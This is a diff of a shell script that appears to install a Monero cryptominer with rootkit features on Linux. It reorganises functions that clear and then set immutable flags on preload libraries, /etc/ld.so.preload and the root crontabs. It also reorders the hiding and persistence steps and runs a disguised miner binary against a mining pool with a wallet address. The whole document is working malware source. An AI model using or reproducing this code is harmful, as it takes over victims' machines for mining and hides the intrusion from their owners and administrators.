@@ -2,13 +2,14 @@
 export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 gcc_bin=$(whereis gcc|awk '{print $2}')
 
-function chattr(){
+function unset_chattr(){
+chattr -ia /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file /etc/crontab /var/spool/cron/crontabs/root /etc/network/if-up.d/ping /etc/network/if-up.d/file /etc/ld.so.preload 2>/dev/null;
 
-chattr -ia /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file /etc/crontab /var/spool/cron/crontabs/root /etc/network/if-up.d/ping /etc/network/if-up.d/file /etc/ld.so.preload 2>/dev/null
+rm -f /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file /etc/crontab /var/spool/cron/crontabs/root /etc/network/if-up.d/ping /etc/network/if-up.d/file /etc/ld.so.preload   2>/dev/null;
+}
 
-rm -f /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file /etc/crontab /var/spool/cron/crontabs/root /etc/network/if-up.d/ping /etc/network/if-up.d/file /etc/ld.so.preload   2>/dev/null
-
-chattr +ia /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file /etc/crontab /var/spool/cron/crontabs/root /etc/network/if-up.d/ping /etc/network/if-up.d/file /etc/ld.so.preload 2>/dev/null
+function set_chattr(){
+chattr +ia /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file /etc/crontab /var/spool/cron/crontabs/root /etc/network/if-up.d/ping /etc/network/if-up.d/file /etc/ld.so.preload 2>/dev/null;
 }
 
 function hide(){
@@ -539,24 +540,26 @@ exec "$local"filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQp
 }
 
 if [[ $1 == "--debian" ]]; then
-chattr
-hide
+unset_chattr
 bind
 setup_init_debian
+hide
+set_chattr
 
 elif [[ $1 == "--mk" ]]; then
-chattr
-hide
+unset_chattr
 bind
 setup_init
+hide
+set_chattr
 
 
 elif [[ $1 == "--cron" ]]; then
-chattr
-hide
+unset_chattr
 bind
 setup_init_cron
-
+hide
+set_chattr
 
 elif [[ $1 == "--nopriv" ]]; then
 bind_nopriv
@@ -566,3 +569,5 @@ else
 printf "system untouched.\n"
 exit 0
 fi
+
+
